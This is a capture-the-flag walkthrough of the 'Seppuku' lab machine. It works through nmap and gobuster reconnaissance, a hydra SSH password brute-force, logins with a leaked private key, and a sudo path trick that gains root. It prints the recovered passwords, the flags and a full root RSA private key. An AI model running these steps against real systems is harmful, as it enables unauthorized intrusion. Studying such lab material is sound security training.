# 4-Seppuku

## [#] Pre-Engagement

- connecting to VPN `sudo openvpn pg.ovpn`    

- editing `/etc/hosts` file to setup IP
    
       
    
    ![](images/Untitled%201.png)
    

- verify if my machine can ping to the $IP
    
    ![](images/Untitled%202.png)
    

## [#] Reconnaisance

## [→] nmap

`sudo nmap -p- $IP`

```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-15 16:01 +0545
Nmap scan report for 192.168.3.128
Host is up (0.00033s latency).
Not shown: 65527 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
7080/tcp open  empowerid
7601/tcp open  unknown
8088/tcp open  radan-http
```

`sudo nmap -sC -sV -p- -O -oA nmap/initial $IP`

```jsx
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-15 16:00 +0545
Nmap scan report for 192.168.3.128
Host is up (0.00025s latency).
Not shown: 65527 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 cd:55:a8:e4:0f:28:bc:b2:a6:7d:41:76:bb:9f:71:f4 (RSA)
|   256 16:fa:29:e4:e0:8a:2e:7d:37:d2:6f:42:b2:dc:e9:22 (ECDSA)
|_  256 bb:74:e8:97:fa:30:8d:da:f9:5c:99:f0:d9:24:8a:d5 (ED25519)
80/tcp   open  http        nginx 1.14.2
|_http-server-header: nginx/1.14.2
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Restricted Content
|_http-title: 401 Authorization Required
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
7080/tcp open  ssl/http    LiteSpeed httpd
|_ssl-date: TLS randomness does not represent time
|_http-server-header: LiteSpeed
| tls-alpn: 
|   h2
|   spdy/3
|   spdy/2
|_  http/1.1
| ssl-cert: Subject: commonName=seppuku/organizationName=LiteSpeedCommunity/stateOrProvinceName=NJ/countryName=US
| Not valid before: 2020-05-13T06:51:35
|_Not valid after:  2022-08-11T06:51:35
|_http-title:  404 Not Found
7601/tcp open  http        Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Seppuku
8088/tcp open  http        LiteSpeed httpd
|_http-server-header: LiteSpeed
|_http-title: Seppuku
MAC Address: 00:50:56:22:DB:40 (VMware)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6
Network Distance: 1 hop
Service Info: Host: SEPPUKU; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2022-06-15T10:16:13
|_  start_date: N/A
|_clock-skew: mean: 1h19m59s, deviation: 2h18m34s, median: 0s
|_nbstat: NetBIOS name: SEPPUKU, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: seppuku
|   NetBIOS computer name: SEPPUKU\x00
|   Domain name: \x00
|   FQDN: seppuku
|_  System time: 2022-06-15T06:16:13-04:00
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2352.09 seconds
```

### [+] Interpretation of the output

1. ports `21,22,80,139,445,7080,7601,8088` are opened with services `ftp,ssh,http,netbios-ssn,netbios-ssn,ssl/http,http,radan-http` respectively 
2. authorization for the `http` service at port `80` is required
3. username = `seppuku`

### [→] visting http site of on opened http port

- `http://seppuku:80`

![](images/Untitled%203.png)

Authorization required so tried some common username and passwords and didn’t got into it

- `https://seppuku:7080`

![](images/Untitled%204.png)

- [`http://seppuku:7601`](http://seppuku:7601/)

![](images/Untitled%205.png)

- [`http://seppuku:8088`](http://seppuku:8088/) shows similar result as above

Now, it’s time for directory enumeration

### [→] gobuster

while enumerating `[http://seppuku:80](http://seppuku:80)` and `[https://seppuku:7080](https://seppuku:7080)` server returns `404` status code 

but for `[http://seppuku:7601](http://seppuku:7601)`

```bash
saurab@0xsaurab ~/g/m/04-Seppuku> gobuster dir -u http://$IP:7601 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html -t 40 -o gobuster/gobuster.initial
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.3.128:7601
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              html,php,txt
[+] Timeout:                 10s
===============================================================
2022/06/15 16:17:12 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 171]
/a                    (Status: 301) [Size: 317] [--> http://192.168.3.128:7601/a/]
/c                    (Status: 301) [Size: 317] [--> http://192.168.3.128:7601/c/]
/t                    (Status: 301) [Size: 317] [--> http://192.168.3.128:7601/t/]
/d                    (Status: 301) [Size: 317] [--> http://192.168.3.128:7601/d/]
/r                    (Status: 301) [Size: 317] [--> http://192.168.3.128:7601/r/]
/b                    (Status: 301) [Size: 317] [--> http://192.168.3.128:7601/b/]
/f                    (Status: 301) [Size: 317] [--> http://192.168.3.128:7601/f/]
/e                    (Status: 301) [Size: 317] [--> http://192.168.3.128:7601/e/]
/h                    (Status: 301) [Size: 317] [--> http://192.168.3.128:7601/h/]
/w                    (Status: 301) [Size: 317] [--> http://192.168.3.128:7601/w/]
/q                    (Status: 301) [Size: 317] [--> http://192.168.3.128:7601/q/]
/database             (Status: 301) [Size: 324] [--> http://192.168.3.128:7601/database/]
/production           (Status: 301) [Size: 326] [--> http://192.168.3.128:7601/production/]
/keys                 (Status: 301) [Size: 320] [--> http://192.168.3.128:7601/keys/]      
/secret               (Status: 301) [Size: 322] [--> http://192.168.3.128:7601/secret/]    
/stg                  (Status: 301) [Size: 319] [--> http://192.168.3.128:7601/stg/]       
/server-status        (Status: 403) [Size: 280]
```

among all the directories, `/keys/` and `/secret/` seems quite interesting 

visiting these two directory we got 

![](images/Untitled%206.png)

![](images/Untitled%207.png)

here we got 

- private RSA key for ssh,
- hostname
- `passwd` file of the machine
- password list
- `shadow` file with hash of user `r` and hostname `abbit-hole`

## [#] Password Attacks

At first glance it seems like I got the power when I saw the key and did `$ wget [http://seppuku:7601/keys/private](http://seppuku:7601/keys/private)` and `$ ssh -i private seppuku@$IP` but I guess the private RSA key wasn’t for the `seppuku` user. Let it be saved for further use

Also we have got the `username` i.e. `seppuku` from `nmap` recon and the password list from the [`http://seppuku:7601/secret/`](http://seppuku:7601/secret/) so immediately I did

`wget [http://seppuku:7601/secret/password.lst](http://seppuku:7601/secret/password.lst)` and used `hydra` to brute-force the password for username `seppuku`

```bash
saurab@0xsaurab ~/g/m/04-Seppuku> hydra -L hostname -P password.lst $IP -t 40 ssh -o hydra/result -I
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-06-15 17:40:58
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 40 tasks per 1 server, overall 40 tasks, 93 login tries (l:1/p:93), ~3 tries per task
[DATA] attacking ssh://192.168.3.128:22/
[22][ssh] host: 192.168.3.128   **login: seppuku   password: eeyoree**
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 10 final worker threads did not complete until end.
[ERROR] 10 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-06-15 17:41:05
```

and guess what… KABOOOM!!! I got the password for the user `seppuku` 

password is `eeyoree`

and now I got the shell!! with `ssh seppuku@$IP` TAAADAAA…

```bash
seppuku@seppuku:~$ whoami
seppuku
seppuku@seppuku:~$ id
uid=1000(seppuku) gid=1000(seppuku) groups=1000(seppuku),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
seppuku@seppuku:~$ ls
local.txt
seppuku@seppuku:~$ cat local.txt 
7e7f3be60c613f1425535126d929786c
seppuku@seppuku:~$ ls -al
total 32
drwxr-xr-x 3 seppuku seppuku 4096 Sep  1  2020 .
drwxr-xr-x 5 root    root    4096 May 13  2020 ..
-rw-r--r-- 1 seppuku seppuku  220 May 13  2020 .bash_logout
-rw-r--r-- 1 seppuku seppuku 3526 May 13  2020 .bashrc
drwx------ 3 seppuku seppuku 4096 May 13  2020 .gnupg
-rw-r--r-- 1 seppuku seppuku   33 Jun 15 06:29 local.txt
-rw-r--r-- 1 root    root      20 May 13  2020 .passwd
-rw-r--r-- 1 seppuku seppuku  807 May 13  2020 .profile
seppuku@seppuku:~$ cat .passwd 
12345685213456!@!@A
seppuku@seppuku:~$ ls -al .gnupg/
total 12
drwx------ 3 seppuku seppuku 4096 May 13  2020 .
drwxr-xr-x 3 seppuku seppuku 4096 Sep  1  2020 ..
drwx------ 2 seppuku seppuku 4096 May 13  2020 private-keys-v1.d
seppuku@seppuku:~$ ls -al .gnupg/private-keys-v1.d/
total 8
drwx------ 2 seppuku seppuku 4096 May 13  2020 .
drwx------ 3 seppuku seppuku 4096 May 13  2020 ..
seppuku@seppuku:~$ sudo -l
Matching Defaults entries for seppuku on seppuku:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User seppuku may run the following commands on seppuku:
    (ALL) NOPASSWD: /usr/bin/ln -sf /root/ /tmp/
seppuku@seppuku:~$ sudo -i
[sudo] password for seppuku: 
Sorry, try again.
[sudo] password for seppuku: 
Sorry, user seppuku is not allowed to execute '/bin/bash' as root on seppuku.
seppuku@seppuku:~$ ls /root
ls: cannot open directory '/root': Permission denied
```

### [FIRST FLAG]

`7e7f3be60c613f1425535126d929786c`

### [+] some recon inside the seppuku user

- interesting file `.passwd`
- user is not given permission for executing any command as `sudo`

### [+] looking for `SUID` binaries

- didn’t got any interesting binary running `find /usr/bin/ -type f -perm -4000`

### [+] other users

analyzing `/etc/passwd` file we got to know that there are two other users : `samurai` and `tanto` 

also we have a RSA private key obtained at [`http://seppuku:7601/keys/private`](http://seppuku:7601/keys/private)

let’s try that for these two users 

**:( ssh -i private samurai@$IP**

**:) ssh -i private tanto@$IP**

and yeahh Indeed the previously obtained private RSA key was for user `tanto`

password for the user `samura` is in the file `.passwd` 

### [SHELL OF THREE USER]

username: `seppukuu` password: `eeyoree`

username: `samurai` password: `12345685213456!@!@A`

username: `tanto` got into shell through private RSA key

## [#] Escalation the shell level

doing `ssh` into user `samurai`

```bash
samurai@seppuku:~$ whoami
samurai
samurai@seppuku:~$ id
uid=1001(samurai) gid=1002(samurai) groups=1002(samurai)
samurai@seppuku:~$ sudo -l
Matching Defaults entries for samurai on seppuku:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User samurai may run the following commands on seppuku:
    (ALL) NOPASSWD: /../../../../../../home/tanto/.cgi_bin/bin /tmp/*
samurai@seppuku:~$
```

we got to know that `samurai` can execute command inside `/home/tanto/.cgi_bin/bin /tmp/` as `sudo` but doing so return command not found 

I sshed into the user `tanto` and checked if there is `.cgi_bin/bin` file in `/home/tanto/` directory but there was not. so what I did is 

```jsx
tanto@seppuku:~$ python -c 'import os; os.system("/bin/bash")'
tanto@seppuku:~$ mkdir .cgi_bin/
tanto@seppuku:~$ echo '/usr/bin/bash' > .cgi_bin/bin
tanto@seppuku:~$ chmod 777 .cgi_bin/bin 
```

and executed `sudo /../../../../../../home/tanto/.cgi_bin/bin /tmp/*` command in the shell of `samurai` user and got the root shell

```bash
root@seppuku:/home/samurai# whoami
root
root@seppuku:/home/samurai# id
uid=0(root) gid=0(root) groups=0(root)
root@seppuku:/home/samurai# cd /root
root@seppuku:~# ls
proof.txt  root.txt
root@seppuku:~# cat root.txt 
Your flag is in another file...
root@seppuku:~# cat proof.txt 
42d824a689fae63af3d63400e98d573b
```

### [R00T FLAG]

`42d824a689fae63af3d63400e98d573b`

## [#] Post-Exploitation

in `/root/.ssh/` folder we got the RSA private key for the `root` shell

```bash
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA0qKvFdbmLH5QMTbLodPPdwU6byD4Ws8RLr5X3oZvnDyvvVlL
uJi5kDBXPjlpcUxWjLzWzGH7HHGdQYm5UoW9jJS2Acj817PbnfWtZaOSVSHwdttt
NrizVhMjkBNW8XpRavlpqoGQKsp1gxheAYoNxa6H5e7ZL89Zv2aWs2bmdYgcadhC
NYTYddupsDp8xNuTHtGN+le4xesE4+5etghBPE4cNFbY0te0FeC/C6fowo/+2UuN
PsQGrdK87/tbudMKSZpg2WaRbjjJxrVmlAmLEtb+Zt/oTFSDIWYG0X+ul/6HT1S7
MnuGaFiEEKWUTD6LOLnq8WJ3JDtUEl9G1JMTbwIDAQABAoIBAE0ixnt491HT8AoV
xvy8VH2BrKSFrm2S5vf3PLaBBN5yWuk8ij5Pr6TeDxT6cWLMUeW4QfEW8J65/JzD
ktpln8SbsQt2TyGu+/4cuiM+g5gplaXxNU2U1hfvalaYvn4wDSDftZJ7YBBLlD0t
7z8hD2oVQC80CNU5WeR97TJFvJ/NToaNOVY2cvz3d4sS/1zIts+5H7OxaUUekWeq
OjayahRCFJoeW+IK3pXzInNUY1kaI1jOuJHhzln5W6jC+VwhbDKrxIndWRYlmhvH
mm+sp5z8csTI7LGJPAZIstduZEGV2HEM7FuI+lcTh2ReO1Y5fr5VgV0FpAAyNQxj
h5BD9gECgYEA6Iq27YbPyZAiGF9GOiyxwX12dLar2YRjhIyItJstkhMGijECXpZE
cj7yS0o4t9xE2QmOJ+Gb9eZA7sD8Q9Ns8t65tAny3tp06kOqfxsUKZBMBt/+apkc
SzpFdvDdJRx1/6vkBNP/enzqJV/OJmebS1lZMiFL18C4y2FVrKJjOnMCgYEA5+I/
XothrLpDlsAdyp44oOZ5/thPZzUoXtMBoj6PPcR034lFkMKlrrdW+zIsDDunWHfT
DlFFE44ksHcISWcjGe8PMKz1CAs+68j/ZzllFv8WEBb4LIWWn4CtQ8I+OyWUikup
D13qZ7zcows8IDE3Kh1I1PIloV/cE/h0kXOZmBUCgYAv/mEeyNId0aeXzCIcY5kU
TCaklAcHz7ESbEbSr6xKF68j2lWY2/6obaFoNJtcJxP2j2hNhty/dZQ1MpNeFEbK
IXnGVL9Ri1jR+ME5lockxOlMCfLiYVNbm1023SNnQ2Z/LCTVckOqLhnNOOa9Omjs
tjYYiJK0psv8/cvG44UDTQKBgQCYBdZxz4Nr0Hn7XVyqt+x8YF3e3EXCbjFXaZMK
oWUbo67T1pVLALHKx9w4t331Ty65a2VtX46f8XLQVlmSdhGnMPmOefXzHhxUTORU
8mX6G6aFSenOlo5XZ+8wGyrdcBfgSxY9Qt8ov8MPCZCTsnBuJeDX6yEMmWIZnawe
p+EsuQKBgHM/ESdE/NoKeS/iVnPGGjX++5YCLX4zlOh/vADu4AuFXSWXqqpdRXiA
5x8+Zs+/rwXiJYOBgveJdc1bmT3ABNJWYOG+UNP1uO1Ko/bMXJ3tCVQ/bfpH6toU
LmnBykbY7bUfrfZUZKOweO1AUbnOVBlhAyO10B8ueairlNdFrLvo
-----END RSA PRIVATE KEY----- 
```